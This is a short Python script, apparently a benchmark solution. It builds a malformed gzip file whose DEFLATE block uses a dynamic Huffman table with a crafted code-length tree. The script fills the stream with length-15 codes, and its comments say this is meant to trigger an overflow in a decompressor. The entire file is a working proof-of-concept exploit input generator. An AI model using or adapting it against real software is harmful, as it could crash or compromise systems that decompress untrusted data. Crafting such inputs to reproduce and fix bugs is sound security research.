import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        
        class BitStream:
            def __init__(self):
                self.bits = []
            
            def write(self, value: int, num_bits: int):
                for i in range(num_bits):
                    if (value >> i) & 1:
                        self.bits.append(1)
                    else:
                        self.bits.append(0)
            
            def get_bytes(self) -> bytes:
                while len(self.bits) % 8 != 0:
                    self.bits.append(0)
                
                byte_array = bytearray()
                for i in range(0, len(self.bits), 8):
                    byte = 0
                    for j in range(8):
                        if self.bits[i+j] == 1:
                            byte |= (1 << j)
                    byte_array.append(byte)
                return bytes(byte_array)

        # Gzip header (10 bytes)
        header = b'\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\xff'

        bs = BitStream()

        # DEFLATE block header: BFINAL=1, BTYPE=2 (Dynamic Huffman)
        bs.write(1, 1)
        bs.write(2, 2)

        # Huffman table definition counts
        bs.write(0, 5)    # HLIT = 0 (257 literal/length codes)
        bs.write(0, 5)    # HDIST = 0 (1 distance code)
        bs.write(15, 4)   # HCLEN = 15 (19 code length codes)

        # Code Length (CL) tree definition
        # We provide 19 lengths (HCLEN+4). The order of symbols is specified by DEFLATE.
        # We create a minimal tree to encode symbols 0 and 15.
        # Assign length 1 to symbol 0 (at order index 3) and symbol 15 (at order index 18).
        cl_lens_in_order = [0] * 19
        cl_lens_in_order[3] = 1
        cl_lens_in_order[18] = 1
        
        for length in cl_lens_in_order:
            bs.write(length, 3)

        # Main tree lengths.
        # The canonical codes for our CL tree are '0' for symbol 0 and '1' for symbol 15.
        # We need to specify a code length of 15 to trigger the overflow.
        # The code for length 15 is '1'.
        # We fill the remainder of the 17-byte (136-bit) DEFLATE stream
        # with this code.
        # Bits used so far: 3 + 5 + 5 + 4 + (19 * 3) = 74 bits.
        # Remaining bits: 136 - 74 = 62.
        num_overflow_writes = 62
        for _ in range(num_overflow_writes):
            bs.write(1, 1)

        deflate_stream = bs.get_bytes()
        
        return header + deflate_stream
